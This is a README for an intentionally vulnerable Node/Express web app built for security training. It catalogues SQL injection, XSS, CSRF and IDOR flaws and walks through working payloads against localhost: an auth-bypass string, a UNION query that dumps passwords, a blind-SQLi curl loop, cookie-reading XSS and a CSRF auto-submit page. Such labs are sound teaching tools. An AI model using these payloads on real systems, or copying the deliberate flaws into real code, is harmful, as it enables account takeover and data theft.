# node-vuln-app

An intentionally vulnerable Node/Express web app for security training.
Sibling to `JavaVulnerableLab` — same spirit, different stack.

> :warning: **Do not deploy.** Only run on a loopback interface inside an
> isolated VM, container, or trusted dev machine. Several endpoints allow
> arbitrary data theft and account takeover by design.

## What it demonstrates

| Class | Endpoint | Flaw |
| --- | --- | --- |
| SQLi — classic | `POST /login` | string-concat SQL; `admin' --` bypass |
| SQLi — UNION | `GET /search` | 3-col SELECT with concatenated `q` |
| SQLi — blind | `GET /account/check` | boolean oracle via response text |
| XSS — reflected | `GET /hello` | query param rendered with `<%- %>` |
| XSS — stored | `GET/POST /messages` | message body rendered as raw HTML |
| CSRF — email | `POST /profile/update` | no token, cookie has no SameSite |
| CSRF — password | `POST /profile/password` | same, higher blast |
| IDOR — files | `GET /file?id=N` | no ownership check |
| IDOR — users | `GET /user/:id` | leaks private fields to anyone |

## Setup

Requires Node 18+.

```bash
cd node-vuln-app
npm install
npm run seed     # creates data/vuln.sqlite and populates demo users
npm start        # http://localhost:3000
```

Demo accounts (plaintext passwords — by design):

| user | pass | role |
| --- | --- | --- |
| admin | admin123 | admin |
| alice | wonderland | user |
| bob | builder | user |
| carol | carolpass | user |

## Exploit walkthrough

### 1. Classic SQL injection (auth bypass)

Log in with:

- username: `admin' --`
- password: *(anything)*

The app builds
`SELECT id, username, role FROM users WHERE username = 'admin' --' AND password = '...'`
and you are admin.

### 2. UNION-based SQL injection

```
http://localhost:3000/search?q=zzz' UNION SELECT id, username, password FROM users --
```

The results table renders username/password pairs in the author/body columns.

### 3. Boolean-blind SQL injection

`/account/check?name=admin' AND substr(password,1,1)='a' --`
returns "No such account." — wrong guess.

`/account/check?name=admin' AND substr(password,1,1)='a' --` etc., iterating
over the alphabet and position until the page flips to "Account exists." leaks
the admin password.

Quick leak script:

```bash
for c in {a..z} {0..9}; do
  r=$(curl -s "http://localhost:3000/account/check?name=admin%27%20AND%20substr(password,1,1)=%27$c%27%20--")
  echo "$r" | grep -q 'Account exists' && echo "char 1 = $c"
done
```

### 4. Reflected XSS

`http://localhost:3000/hello?greet=<script>alert(document.cookie)</script>`

### 5. Stored XSS

Log in as any user, go to `/messages`, post:

```html
<img src=x onerror="alert('stored-xss: ' + document.cookie)">
```

Every subsequent visitor executes it.

### 6. CSRF — silently change a victim's email

Save this as `attacker.html` and open it in a browser where you are logged
in as alice:

```html
<!doctype html>
<html><body>
<form id=f action="http://localhost:3000/profile/update" method="post">
  <input name="email" value="attacker@evil.test">
  <input name="bio" value="pwned">
</form>
<script>document.getElementById('f').submit()</script>
</body></html>
```

Serve it from any other origin (even `file://`) and the victim's email is
overwritten. Same pattern against `/profile/password` = account takeover.

### 7. IDOR

- `/file?id=1` — admin's notes, regardless of who you are logged in as.
- `/user/3` — bob's email address, no login required at all.

## Layout

```
node-vuln-app/
  server.js           # express app, sessions, route mounts
  db.js               # sqlite wrapper (with a deliberate raw-SQL helper)
  seed.js             # schema + demo data
  routes/
    auth.js           # login (classic SQLi) + register
    sqli.js           # /search (UNION), /account/check (blind)
    xss.js            # /hello (reflected), /messages (stored)
    profile.js        # /profile + CSRF-vulnerable updates
    idor.js           # /files, /file?id=, /user/:id
  views/*.ejs         # EJS templates
  public/css/style.css
```

Each vulnerable route is flagged with a `VULN:` comment explaining the flaw
and linking to an exploit example.

## Not included (yet)

The original JavaVulnerableLab also demonstrates XXE, XPath injection,
broken session management (URL rewriting), weak hashing, and open redirects.
Those are out of scope for this core-subset build; extend as needed.
